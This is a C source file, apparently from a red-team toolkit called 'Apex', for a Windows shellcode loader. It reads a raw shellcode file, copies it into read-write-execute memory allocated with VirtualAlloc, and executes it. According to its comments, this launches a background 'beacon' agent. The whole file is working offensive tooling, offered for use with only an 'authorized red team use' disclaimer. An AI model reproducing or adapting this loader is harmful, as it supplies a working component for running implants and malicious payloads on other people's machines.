/*
 * Apex Shellcode Loader — Test harness for PIC shellcode (.bin)
 *
 * Reads a raw shellcode file, allocates RWX memory, copies it in,
 * and executes it. For testing the PIC-generated agent.bin.
 *
 * Compile (on Windows or with MinGW):
 *   x86_64-w64-mingw32-gcc -O2 -o shellcode_loader.exe shellcode_loader.c
 *
 * Usage:
 *   shellcode_loader.exe agent.bin
 *
 * WARNING: This is a test tool for authorized red team use only.
 *          Do NOT run untrusted shellcode.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Apex Shellcode Loader\n");
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        printf("\nLoads and executes PIC shellcode in-memory.\n");
        return 1;
    }

    /* Read shellcode file */
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        printf("[-] Cannot open: %s\n", argv[1]);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0 || sz > 50 * 1024 * 1024) {
        printf("[-] Invalid file size: %ld bytes\n", sz);
        fclose(f);
        return 1;
    }

    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) {
        printf("[-] malloc failed\n");
        fclose(f);
        return 1;
    }
    fread(buf, 1, (size_t)sz, f);
    fclose(f);

    printf("[*] Loaded %ld bytes from %s\n", sz, argv[1]);

    /* Verify MZ header is NOT at offset 0 (it's PIC, not a PE) */
    if (sz >= 2 && buf[0] == 'M' && buf[1] == 'Z') {
        printf("[!] WARNING: File starts with MZ header — this looks like a PE, not PIC shellcode.\n");
        printf("[!] True PIC shellcode should NOT start with MZ.\n");
    }

    /* Allocate RWX memory */
    LPVOID exec_mem = VirtualAlloc(NULL, (SIZE_T)sz,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        free(buf);
        return 1;
    }

    printf("[*] Allocated RWX memory at %p\n", exec_mem);

    /* Copy shellcode */
    memcpy(exec_mem, buf, (size_t)sz);
    free(buf);

    printf("[*] Executing shellcode...\n");
    printf("[*] Shellcode will block this thread (beacon runs in background).\n");
    printf("[*] Press Ctrl+C to exit.\n\n");

    /* Execute — the PIC stub blocks forever after spawning the beacon thread */
    typedef void (*shellcode_fn)(void);
    shellcode_fn run = (shellcode_fn)exec_mem;
    run();

    /* Should never reach here — stub loops internally */
    printf("\n[!] Shellcode returned unexpectedly\n");
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
